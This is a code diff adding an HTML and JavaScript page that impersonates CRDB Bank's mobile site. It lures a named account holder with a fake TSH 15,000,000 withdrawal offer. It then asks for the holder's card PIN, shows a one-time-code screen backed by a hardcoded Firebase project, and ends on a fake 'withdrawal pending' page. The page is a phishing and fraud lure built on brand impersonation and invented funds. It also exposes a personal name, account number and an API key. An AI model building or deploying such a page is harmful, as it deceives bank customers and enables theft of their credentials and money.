@@ -1,0 +1,1029 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CRDB Bank</title>
+    <!-- Fonts and Icons -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        /* CSS LEVERAGE INITIATED */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+        }
+
+        /* Simulates the mobile screen */
+        .mobile-container {
+            width: 100%;
+            max-width: 414px;
+            background-color: #ffffff;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+        }
+
+        /* --- VIEW SWITCHING SYSTEM --- */
+        .view-section {
+            display: none;
+            opacity: 0;
+            transform: translateY(20px);
+            transition: opacity 0.4s ease, transform 0.4s ease;
+            width: 100%;
+            min-height: 100vh;
+        }
+        .view-section.active {
+            display: block;
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        /* --- TOAST NOTIFICATION --- */
+        .toast {
+            position: fixed;
+            bottom: -100px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #388E3C;
+            color: white;
+            padding: 14px 24px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            transition: bottom 0.4s ease;
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            width: 90%;
+            max-width: 350px;
+            justify-content: center;
+        }
+        .toast.show {
+            bottom: 30px;
+        }
+
+        /* --- TOP NAVIGATION --- */
+        .top-nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 15px;
+            background-color: #ffffff;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .logo-text {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            line-height: 1;
+        }
+
+        .crdb {
+            font-family: Impact, sans-serif;
+            font-size: 22px;
+            color: #4CB050;
+            letter-spacing: 1px;
+        }
+
+        .bank {
+            background-color: #4CB050;
+            color: white;
+            font-weight: 900;
+            font-size: 10px;
+            padding: 2px 6px;
+            width: 100%;
+            text-align: center;
+            letter-spacing: 1px;
+        }
+
+        .logo-lines {
+            display: flex;
+            align-items: center;
+            height: 30px;
+        }
+
+        .line-group {
+            display: flex;
+            flex-direction: column;
+            gap: 3px;
+        }
+
+        .line {
+            display: block;
+            width: 15px;
+            height: 3px;
+            background-color: #4CB050;
+        }
+
+        .nav-icons {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            font-size: 18px;
+            color: #000;
+        }
+
+        .menu-box {
+            border: 1px solid #dcdcdc;
+            border-radius: 6px;
+            padding: 6px 10px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        /* --- WITHDRAWAL ALERT --- */
+        .withdraw-alert {
+            background-color: #fff5f5;
+            border-left: 5px solid #e53e3e;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            animation: pulse-border 2s infinite;
+            box-shadow: 0 4px 6px rgba(229, 62, 62, 0.1);
+            position: relative;
+            z-index: 10;
+        }
+        @keyframes pulse-border {
+            0% { border-left-color: #e53e3e; box-shadow: 0 0 0 0 rgba(229, 62, 62, 0.4); }
+            70% { border-left-color: #ff8a8a; box-shadow: 0 0 0 10px rgba(229, 62, 62, 0); }
+            100% { border-left-color: #e53e3e; box-shadow: 0 0 0 0 rgba(229, 62, 62, 0); }
+        }
+        .alert-icon { background-color: #e53e3e; color: white; width: 40px; height: 40px; border-radius: 50%; display: flex; justify-content: center; align-items: center; font-size: 20px; flex-shrink: 0; }
+        .alert-text { font-size: 14px; color: #1a1a1a; line-height: 1.4; }
+        .alert-text strong { color: #e53e3e; font-size: 16px; }
+        .login-link { background: #4CB050; color: white; padding: 6px 12px; border-radius: 4px; font-weight: 700; text-decoration: none; display: inline-block; margin-top: 8px; font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px; border: none; cursor: pointer; transition: 0.3s; }
+        .login-link:hover { background: #388E3C; }
+
+        /* --- HERO BANNER --- */
+        .hero {
+            position: relative;
+            background-color: #e6f3e6;
+            padding: 30px 20px 60px 20px;
+            overflow: hidden;
+        }
+
+        .hero-content {
+            position: relative;
+            z-index: 2;
+        }
+
+        .ia-logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+
+        .ia-mark {
+            position: relative;
+            width: 50px;
+            height: 50px;
+            display: flex;
+            align-items: flex-end;
+        }
+
+        .i-dot {
+            position: absolute;
+            top: 0;
+            left: 5px;
+            width: 14px;
+            height: 14px;
+            background-color: #8c9e96;
+            border-radius: 50%;
+        }
+
+        .i-stem {
+            position: absolute;
+            bottom: 0;
+            left: 5px;
+            width: 14px;
+            height: 26px;
+            background-color: #0d4339;
+            border-radius: 0 0 5px 5px;
+        }
+
+        .a-shape {
+            position: absolute;
+            bottom: 0;
+            left: 15px;
+            width: 30px;
+            height: 40px;
+            background-color: #8c9e96;
+            border-radius: 20px 20px 0 0;
+            clip-path: polygon(0 0, 100% 0, 100% 100%, 0 100%);
+        }
+
+        .a-shape::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            right: -10px;
+            width: 25px;
+            height: 50px;
+            background-color: #e6f3e6; 
+            border-radius: 50%;
+        }
+
+        .ia-text {
+            display: flex;
+            flex-direction: column;
+            font-size: 26px;
+            line-height: 1;
+            color: #0d4339;
+            font-weight: 500;
+            font-family: Arial, sans-serif;
+        }
+
+        .hero h1 {
+            font-size: 26px;
+            color: #0d4339;
+            font-weight: 900;
+            margin-bottom: 10px;
+            letter-spacing: 0.5px;
+        }
+
+        .hero p {
+            font-size: 18px;
+            color: #1a1a1a;
+            margin-bottom: 5px;
+            font-weight: 400;
+            line-height: 1.4;
+        }
+
+        .btn-register {
+            margin-top: 20px;
+            background-color: #4CB050;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px 24px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        .temple-bg {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 120px;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 50' preserveAspectRatio='none'%3E%3Cpath d='M0,50 L5,35 L10,45 L15,25 L20,40 L25,20 L30,35 L35,15 L40,35 L45,25 L50,45 L55,20 L60,35 L65,10 L70,30 L75,15 L80,40 L85,25 L90,45 L95,35 L100,50 Z' fill='%23a5d6a7' opacity='0.3'/%3E%3C/svg%3E");
+            background-size: cover;
+            background-position: bottom;
+            z-index: 1;
+        }
+
+        .hero-arrow {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #4CB050;
+            font-size: 20px;
+            z-index: 3;
+            cursor: pointer;
+        }
+
+        .hero-arrow.left { left: 5px; }
+        .hero-arrow.right { right: 5px; }
+
+        /* --- FOREX MARKET --- */
+        .forex {
+            padding: 25px 15px;
+            text-align: center;
+            background-color: #ffffff;
+        }
+
+        .forex h2 {
+            font-size: 14px;
+            color: #333;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            margin-bottom: 15px;
+        }
+
+        .forex-ticker {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+
+        .divider {
+            color: #ccc;
+            font-weight: 300;
+        }
+
+        .flag {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+
+        .rate {
+            font-size: 15px;
+            color: #1a1a1a;
+            font-weight: 700;
+        }
+
+        .view-all {
+            color: #4CB050;
+            text-decoration: none;
+            font-size: 12px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+
+        /* --- PATTERN DIVIDER --- */
+        .pattern-divider {
+            height: 24px;
+            background-color: #4CB050;
+            background-image: 
+                repeating-linear-gradient(90deg, transparent, transparent 8px, #fff 8px, #fff 10px),
+                repeating-linear-gradient(0deg, transparent, transparent 6px, #4CB050 6px, #4CB050 8px);
+            background-size: 20px 100%, 100% 10px;
+            border-top: 3px solid #4CB050;
+            border-bottom: 3px solid #4CB050;
+        }
+
+        /* --- WELCOME SECTION / TABS --- */
+        .welcome-section {
+            background-color: #4CB050;
+            padding-top: 30px;
+        }
+
+        .welcome-section h2 {
+            color: white;
+            text-align: center;
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 25px;
+        }
+
+        .tabs {
+            display: flex;
+            overflow-x: auto;
+            gap: 20px;
+            padding: 0 15px;
+            scrollbar-width: none; 
+        }
+
+        .tabs::-webkit-scrollbar {
+            display: none; 
+        }
+
+        .tab {
+            color: white;
+            font-size: 13px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            padding-bottom: 15px;
+            white-space: nowrap;
+            opacity: 0.7;
+            cursor: pointer;
+            border-bottom: 3px solid transparent;
+        }
+
+        .tab.active {
+            opacity: 1;
+            border-bottom: 3px solid white;
+        }
+
+        /* --- CAROUSEL AREA --- */
+        .carousel-area {
+            background-color: #4CB050;
+            padding: 40px 20px 60px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .arrow-btn {
+            background-color: white;
+            color: #4CB050;
+            border: none;
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 12px;
+            cursor: pointer;
+        }
+
+        .icon-circle {
+            width: 160px;
+            height: 160px;
+            border: 1px solid rgba(255, 255, 255, 0.6);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 30px;
+        }
+
+        .icon-circle svg {
+            width: 100%;
+            height: 100%;
+        }
+
+        .bottom-text {
+            background-color: #4CB050;
+            color: rgba(255, 255, 255, 0.5);
+            text-align: center;
+            font-size: 16px;
+            padding-bottom: 20px;
+            margin-top: -20px;
+        }
+
+        /* =========================================
+           LOGIN & OTP VERIFICATION STYLES
+           ========================================= */
+        .auth-header {
+            background-color: #ffffff;
+            padding: 30px 30px 20px 30px;
+            text-align: center;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        .forms-wrapper { padding: 30px; }
+        
+        .account-display {
+            background-color: #f0f9f0;
+            border: 1px solid #c8e6c9;
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 20px;
+            text-align: center;
+            color: #1f2937;
+            font-size: 14px;
+        }
+        .account-display strong { color: #4CB050; }
+
+        .input-group { position: relative; margin-bottom: 20px; }
+        .input-group i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: #6b7280; font-size: 16px; }
+        .input-group input { width: 100%; padding: 14px 15px 14px 45px; border: 1.5px solid #e5e7eb; border-radius: 8px; font-size: 15px; color: #1f2937; background-color: #fafafa; outline: none; transition: all 0.3s; }
+        .input-group input:focus { border-color: #4CB050; background-color: #ffffff; box-shadow: 0 0 0 4px rgba(76, 176, 80, 0.1); }
+        .input-group input:read-only { background-color: #f3f4f6; color: #6b7280; cursor: not-allowed; }
+        
+        .form-actions { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; font-size: 13px; }
+        .checkbox-group { display: flex; align-items: center; gap: 8px; color: #6b7280; cursor: pointer; }
+        .forgot-link { color: #4CB050; text-decoration: none; font-weight: 600; }
+
+        .btn-submit { width: 100%; padding: 14px; background-color: #4CB050; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.3s; display: flex; justify-content: center; align-items: center; gap: 10px; }
+        .btn-submit:hover:not(:disabled) { background-color: #388E3C; }
+        .btn-submit:disabled { background-color: #a0aec0; cursor: not-allowed; }
+        .back-btn { background: none; border: none; color: #6b7280; font-size: 14px; cursor: pointer; display: flex; align-items: center; gap: 5px; margin-top: 20px; }
+        .back-btn:hover { color: #4CB050; }
+
+        /* OTP Verification Styles */
+        .verification-content { padding: 40px 30px; text-align: center; }
+        .shield-icon { width: 70px; height: 70px; background-color: rgba(76, 176, 80, 0.1); color: #4CB050; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 30px; margin: 0 auto 20px auto; animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(76, 176, 80, 0.4); } 70% { box-shadow: 0 0 0 15px rgba(76, 176, 80, 0); } 100% { box-shadow: 0 0 0 0 rgba(76, 176, 80, 0); } }
+        
+        .verification-content h2 { font-size: 22px; color: #1f2937; margin-bottom: 10px; }
+        .verification-content p { font-size: 14px; color: #6b7280; margin-bottom: 30px; line-height: 1.5; }
+        .verification-content strong { color: #1f2937; }
+        
+        .otp-container { display: flex; justify-content: space-between; gap: 10px; margin-bottom: 25px; }
+        .otp-input { width: 50px; height: 60px; border: 2px solid #e5e7eb; border-radius: 10px; text-align: center; font-size: 24px; font-weight: 700; color: #1f2937; background-color: #fafafa; outline: none; transition: 0.2s; }
+        .otp-input:focus { border-color: #4CB050; background-color: #ffffff; box-shadow: 0 0 0 4px rgba(76, 176, 80, 0.1); }
+
+        .timer-container { display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 30px; font-size: 15px; font-weight: 600; }
+        .timer-text { color: #4CB050; font-size: 18px; font-family: monospace; }
+        .timer-container.expired .timer-text, .timer-container.expired i { color: #e53e3e; }
+        
+        .resend-area { margin-top: 25px; font-size: 14px; color: #6b7280; }
+        .resend-btn { background: none; border: none; color: #4CB050; font-weight: 600; font-size: 14px; cursor: pointer; display: none; }
+
+        /* =========================================
+           PENDING PAGE STYLES
+           ========================================= */
+        .pending-content { padding: 50px 30px; text-align: center; }
+        .pending-icon { width: 80px; height: 80px; background-color: #fff8e1; color: #f59e0b; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 36px; margin: 0 auto 25px auto; }
+        .pending-content h2 { font-size: 24px; color: #1f2937; margin-bottom: 15px; }
+        .pending-content p { font-size: 15px; color: #6b7280; line-height: 1.6; margin-bottom: 15px; }
+        .pending-content strong { color: #e53e3e; font-size: 18px; }
+        .status-badge { display: inline-block; background-color: #fef3c7; color: #92400e; padding: 6px 16px; border-radius: 20px; font-size: 13px; font-weight: 700; margin-top: 20px; }
+    </style>
+</head><body>
+
+    <!-- Toast Notification Container -->
+    <div id="toast" class="toast">
+        <i class="fa-solid fa-circle-check"></i>
+        <span id="toast-message">Your withdrawal is successfully</span>
+    </div>
+
+    <div class="mobile-container">
+        
+        <!-- =========================================
+             VIEW 1: LANDING PAGE
+             ========================================= -->
+        <div id="landing-view" class="view-section active">
+            <!-- TOP NAVIGATION -->
+            <header class="top-nav">
+                <div class="logo-container">
+                    <div class="logo-lines">
+                        <div class="line-group"><span class="line"></span><span class="line"></span><span class="line"></span></div>
+                    </div>
+                    <div class="logo-text">
+                        <span class="crdb">CRDB</span>
+                        <span class="bank">BANK</span>
+                    </div>
+                    <div class="logo-lines">
+                        <div class="line-group"><span class="line"></span><span class="line"></span><span class="line"></span></div>
+                    </div>
+                </div>
+                <div class="nav-icons">
+                    <i class="fa-solid fa-phone-volume"></i>
+                    <i class="fa-solid fa-location-dot"></i>
+                    <i class="fa-solid fa-magnifying-glass"></i>
+                    <div class="menu-box" onclick="switchView('auth-view')">
+                        <i class="fa-solid fa-bars"></i>
+                    </div>
+                </div>
+            </header>
+
+            <!-- WITHDRAWAL ALERT BANNER -->
+            <div class="withdraw-alert">
+                <div class="alert-icon"><i class="fa-solid fa-money-bill-transfer"></i></div>
+                <div class="alert-text">
+                    <strong>Withdraw TSH.15,000,000.00</strong> to your bank.
+                    <br>
+                    <button onclick="switchView('auth-view')" class="login-link">Login to withdraw <i class="fa-solid fa-arrow-right"></i></button>
+                </div>
+            </div>
+
+            <!-- HERO BANNER -->
+            <section class="hero">
+                <div class="hero-content">
+                    <!-- Invest Africa Logo -->
+                    <div class="ia-logo">
+                        <div class="ia-mark">
+                            <span class="i-dot"></span>
+                            <span class="i-stem"></span>
+                            <span class="a-shape"></span>
+                        </div>
+                        <div class="ia-text">
+                            <span>invest</span>
+                            <span>africa</span>
+                        </div>
+                    </div>
+                    
+                    <h1>AFRICA INVESTOR FORUM</h1>
+                    <p>Connecting Africa's Growth to the World's</p>
+                    <p>Capital</p>
+                    
+                    <!-- CHANGED TO LOGIN NOW -->
+                    <button class="btn-register" onclick="switchView('auth-view')">Login Now</button>
+                </div>
+                
+                <!-- Temple Silhouette Background -->
+                <div class="temple-bg"></div>
+                
+                <div class="hero-arrow left"><i class="fa-solid fa-chevron-left"></i></div>
+                <div class="hero-arrow right"><i class="fa-solid fa-chevron-right"></i></div>
+            </section>
+
+            <!-- FOREX MARKET -->
+            <section class="forex">
+                <h2>FOREX MARKET</h2>
+                <div class="forex-ticker">
+                    <span class="divider">|</span>
+                    <img src="https://flagcdn.com/w80/dk.png" alt="Denmark" class="flag">
+                    <span class="rate">DKK: Buy 378.92 - Sell 408.92</span>
+                    <img src="https://flagcdn.com/w80/cn.png" alt="China" class="flag">
+                    <span class="divider">|</span>
+                </div>
+                <a href="#" class="view-all">VIEW ALL</a>
+            </section>
+
+            <!-- PATTERN DIVIDER -->
+            <div class="pattern-divider"></div>
+
+            <!-- WELCOME / TABS -->
+            <section class="welcome-section">
+                <h2>Welcome! How can we help you?</h2>
+                
+                <div class="tabs">
+                    <div class="tab active">ACCOUNTS</div>
+                    <div class="tab">INVEST</div>
+                    <div class="tab">BORROW</div>
+                    <div class="tab">INSURE</div>
+                    <div class="tab">TRANSA</div>
+                </div>
+            </section>
+
+            <!-- CAROUSEL AREA -->
+            <section class="carousel-area">
+                <button class="arrow-btn"><i class="fa-solid fa-chevron-left"></i></button>
+                
+                <div class="icon-circle">
+                    <!-- Desk Icon SVG -->
+                    <svg viewBox="0 0 100 100" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <circle cx="30" cy="45" r="6" />
+                        <path d="M20 70 v-10 a10 10 0 0 1 20 0 v10" />
+                        <path d="M10 70 h80" />
+                        <path d="M25 70 v15 M75 70 v15" />
+                        <rect x="45" y="30" width="40" height="30" rx="2" />
+                        <path d="M50 45 l10 -10 l5 5 l10 -10" />
+                        <circle cx="50" cy="45" r="1.5" fill="white" />
+                        <circle cx="60" cy="35" r="1.5" fill="white" />
+                        <circle cx="65" cy="40" r="1.5" fill="white" />
+                        <circle cx="75" cy="30" r="1.5" fill="white" />
+                        <path d="M65 60 v10" /> 
+                    </svg>
+                </div>
+
+                <button class="arrow-btn"><i class="fa-solid fa-chevron-right"></i></button>
+            </section>
+            
+            <!-- Bottom cut off text -->
+            <div class="bottom-text">Chat with us</div>
+        </div>
+
+        <!-- =========================================
+             VIEW 2: LOGIN PAGE
+             ========================================= -->
+        <div id="auth-view" class="view-section">
+            <div class="auth-header">
+                <div class="logo-text">
+                    <span class="crdb">CRDB</span>
+                    <span class="bank">BANK</span>
+                </div>
+            </div>
+
+            <div class="forms-wrapper">
+                <form id="login-form">
+                    
+                    <div class="account-display">
+                        <strong>Name:</strong> Paschal Slaa
+                    </div>
+
+                    <!-- CHANGED TO ACCOUNT NUMBER -->
+                    <div class="input-group">
+                        <i class="fa-solid fa-user"></i>
+                        <input type="text" placeholder="Account Number" value="0152427866500" readonly id="account-input">
+                    </div>
+                    
+                    <!-- CHANGED TO CARD PIN (4 DIGITS) -->
+                    <div class="input-group">
+                        <i class="fa-solid fa-credit-card"></i>
+                        <input type="password" placeholder="Card Pin (4 digits)" maxlength="4" minlength="4" inputmode="numeric" pattern="[0-9]{4}" required id="pin-input">
+                    </div>
+
+                    <div class="form-actions">
+                        <label class="checkbox-group">
+                            <input type="checkbox"> Remember me
+                        </label>
+                        <a href="#" class="forgot-link">Forgot Pin?</a>
+                    </div>
+
+                    <button type="submit" class="btn-submit" id="login-btn">
+                        <span>Sign In Securely</span>
+                    </button>
+                    
+                    <button type="button" class="back-btn" onclick="switchView('landing-view')">
+                        <i class="fa-solid fa-arrow-left"></i> Back to Home
+                    </button>
+                </form>
+            </div>
+        </div>
+
+        <!-- =========================================
+             VIEW 3: VERIFICATION PAGE
+             ========================================= -->
+        <div id="verify-view" class="view-section">
+            <div class="auth-header">
+                <div class="logo-text">
+                    <span class="crdb">CRDB</span>
+                    <span class="bank">BANK</span>
+                </div>
+            </div>
+
+            <div class="verification-content">
+                <div class="shield-icon">
+                    <i class="fa-solid fa-shield-halved"></i>
+                </div>
+                
+                <h2>Verify Your Identity</h2>
+                <p>We've sent a 6-digit verification code for<br><strong id="display-account">0152427866500</strong>. Please enter it below.</p>
+
+                <div class="otp-container">
+                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" autofocus>
+                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                    <input type="text" class="otp-input" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                </div>
+
+                <div class="timer-container" id="timer-container">
+                    <i class="fa-solid fa-clock" style="color: #4CB050;"></i>
+                    <span>Code expires in: <span class="timer-text" id="countdown">02:00</span></span>
+                </div>
+
+                <button type="button" class="btn-submit" id="verify-btn" onclick="verifyCode()">Verify & Proceed</button>
+
+                <div class="resend-area">
+                    Didn't receive the code? 
+                    <button class="resend-btn" id="resend-btn" onclick="resendOTP()">Resend Code</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- =========================================
+             VIEW 4: PENDING PAGE
+             ========================================= -->
+        <div id="pending-view" class="view-section">
+            <div class="auth-header">
+                <div class="logo-text">
+                    <span class="crdb">CRDB</span>
+                    <span class="bank">BANK</span>
+                </div>
+            </div>
+
+            <div class="pending-content">
+                <div class="pending-icon">
+                    <i class="fa-solid fa-hourglass-half"></i>
+                </div>
+                <h2>Transaction Pending</h2>
+                <p>Your withdrawal of <br><strong>TSH. 15,000,000.00</strong></p>
+                <p>is currently being processed. Please wait while the system verifies the transaction.</p>
+                
+                <div class="status-badge">STATUS: PENDING</div>
+            </div>
+        </div>
+
+    </div>    <!-- =========================================
+         JAVASCRIPT & FIREBASE SYNC
+         ========================================= -->
+    <script type="module">
+        // 1. Import Firebase modules
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getDatabase, ref, set, get } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+
+        // 2. Your injected config
+        const firebaseConfig = {
+            apiKey: "AIzaSyAeOvMJiQLNiKtlFp9wYyI3UOpA3vkqH4Y",
+            authDomain: "crdb-bank.firebaseapp.com",
+            databaseURL: "https://crdb-bank-default-rtdb.europe-west1.firebasedatabase.app",
+            projectId: "crdb-bank",
+            storageBucket: "crdb-bank.firebasestorage.app",
+            messagingSenderId: "227547483432",
+            appId: "1:227547483432:web:69a2201de150303a0ad41d",
+            measurementId: "G-QH1ZHPGB4S"
+        };
+
+        // 3. Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+        console.log("Firebase Synced!");
+
+        // --- DOM ELEMENTS ---
+        const loginForm = document.getElementById('login-form');
+        const loginBtn = document.getElementById('login-btn');
+        const accountInput = document.getElementById('account-input');
+        const pinInput = document.getElementById('pin-input');
+        const displayAccount = document.getElementById('display-account');
+        
+        const inputs = document.querySelectorAll('.otp-input');
+        const countdownEl = document.getElementById('countdown');
+        const timerContainer = document.getElementById('timer-container');
+        const verifyBtn = document.getElementById('verify-btn');
+        const resendBtn = document.getElementById('resend-btn');
+        const resendArea = document.querySelector('.resend-area');
+
+        const toast = document.getElementById('toast');
+        const toastMessage = document.getElementById('toast-message');
+
+        let currentAccountKey = "";
+        let timeLeft = 120; 
+        let timerInterval;
+
+        // --- CUSTOM TOAST NOTIFICATION ---
+        function showToast(message) {
+            toastMessage.textContent = message;
+            toast.classList.add('show');
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3500); // Hide after 3.5 seconds
+        }
+
+        // --- VIEW SWITCHING LOGIC ---
+        window.switchView = function(viewId) {
+            document.querySelectorAll('.view-section').forEach(view => {
+                view.classList.remove('active');
+            });
+            document.getElementById(viewId).classList.add('active');
+        }
+
+        // --- LOGIN & FIREBASE SYNC ---
+        loginForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const accountVal = accountInput.value;
+            const pinVal = pinInput.value;
+
+            // Enforce exactly 4 digits for PIN
+            if (pinVal.length !== 4) {
+                showToast("Card Pin must be exactly 4 digits.");
+                return;
+            }
+
+            currentAccountKey = btoa(accountVal); // Base64 encode account for safe DB keys
+            
+            const originalText = loginBtn.innerHTML;
+            loginBtn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Authenticating...';
+            loginBtn.disabled = true;
+
+            const generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
+            const expiresAt = Date.now() + 120000;
+
+            try {
+                await set(ref(db, 'otps/' + currentAccountKey), {
+                    code: generatedOtp,
+                    expiresAt: expiresAt
+                });
+
+                // NO TOAST/NOTIFICATION HERE - Direct to code page as ordered
+                displayAccount.textContent = accountVal;
+
+                switchView('verify-view');
+                inputs[0].focus();
+                startTimer();
+
+            } catch (error) {
+                console.error("Firebase Error:", error);
+                showToast("Connection error. Please try again.");
+            } finally {
+                loginBtn.innerHTML = originalText;
+                loginBtn.disabled = false;
+            }
+        });
+
+        // --- OTP INPUT UI LOGIC ---
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                const val = e.target.value;
+                if (val.length === 1 && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+
+            input.addEventListener('keypress', (e) => {
+                if (!/[0-9]/.test(e.key)) {
+                    e.preventDefault();
+                }
+            });
+        });
+
+        // --- TIMER LOGIC ---
+        function startTimer() {
+            clearInterval(timerInterval);
+            timeLeft = 120;
+            verifyBtn.disabled = false;
+            timerContainer.classList.remove('expired');
+            resendBtn.style.display = 'none';
+            resendArea.style.display = 'block';
+            updateTimerDisplay();
+
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                updateTimerDisplay();
+
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    timerExpired();
+                }
+            }, 1000);
+        }
+
+        function updateTimerDisplay() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            const formattedTime = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            countdownEl.textContent = formattedTime;
+        }
+
+        function timerExpired() {
+            countdownEl.textContent = "00:00";
+            timerContainer.classList.add('expired');
+            timerContainer.querySelector('span').innerHTML = 'Code Expired. <span class="timer-text" id="countdown">00:00</span>';
+            verifyBtn.disabled = true;
+            resendBtn.style.display = 'inline-block';
+            resendArea.innerHTML = 'Code expired. <button class="resend-btn" id="resend-btn" onclick="resendOTP()" style="display:inline-block;">Click to Resend</button>';
+        }
+
+        // --- VERIFY CODE ---
+        window.verifyCode = async function() {
+            let code = "";
+            let isComplete = true;
+            
+            inputs.forEach(input => {
+                if (input.value === '') isComplete = false;
+                code += input.value;
+            });
+
+            // Enforce exactly 6 digits
+            if (!isComplete || code.length !== 6) {
+                showToast("Please enter exactly 6 digits.");
+                return;
+            }
+
+            verifyBtn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Verifying...';
+            verifyBtn.disabled = true;
+
+            try {
+                const dbRef = ref(db, 'otps/' + currentAccountKey);
+                const snapshot = await get(dbRef);
+
+                if (snapshot.exists()) {
+                    const data = snapshot.val();
+                    const currentTime = Date.now();
+
+                    if (currentTime > data.expiresAt) {
+                        showToast("Code expired. Please resend.");
+                        timerExpired();
+                    } else if (data.code === code) {
+                        
+                        // Clean success toast and redirect to Pending Page
+                        await set(ref(db, 'otps/' + currentAccountKey), null);
+                        
+                        showToast("Your withdrawal is successfully");
+                        
+                        // Wait for toast to be seen, then switch view
+                        setTimeout(() => {
+                            switchView('pending-view');
+                        }, 1500);
+                        
+                    } else {
+                        showToast("Invalid code. Please try again.");
+                    }
+                } else {
+                    showToast("No code found. Please resend.");
+                }
+            } catch (error) {
+                console.error("Firebase Error:", error);
+                showToast("Database error. Check connection.");
+            } finally {
+                verifyBtn.innerHTML = 'Verify & Proceed';
+                if (timeLeft > 0) verifyBtn.disabled = false;
+            }
+        }
+
+        // --- RESEND OTP ---
+        window.resendOTP = async function() {
+            inputs.forEach(input => input.value = '');
+            inputs[0].focus();
+            
+            timerContainer.querySelector('span').innerHTML = 'Code expires in: <span class="timer-text" id="countdown">02:00</span>';
+            window.countdownEl = document.getElementById('countdown');
+            
+            const generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
+            const expiresAt = Date.now() + 120000;
+
+            try {
+                await set(ref(db, 'otps/' + currentAccountKey), {
+                    code: generatedOtp,
+                    expiresAt: expiresAt
+                });
+                // No dev alert, just restart the timer silently
+                startTimer();
+            } catch (error) {
+                console.error("Firebase Error:", error);
+                showToast("Couldn't resend. Check connection.");
+            }
+        }
+    </script>
+</body>
+</html>
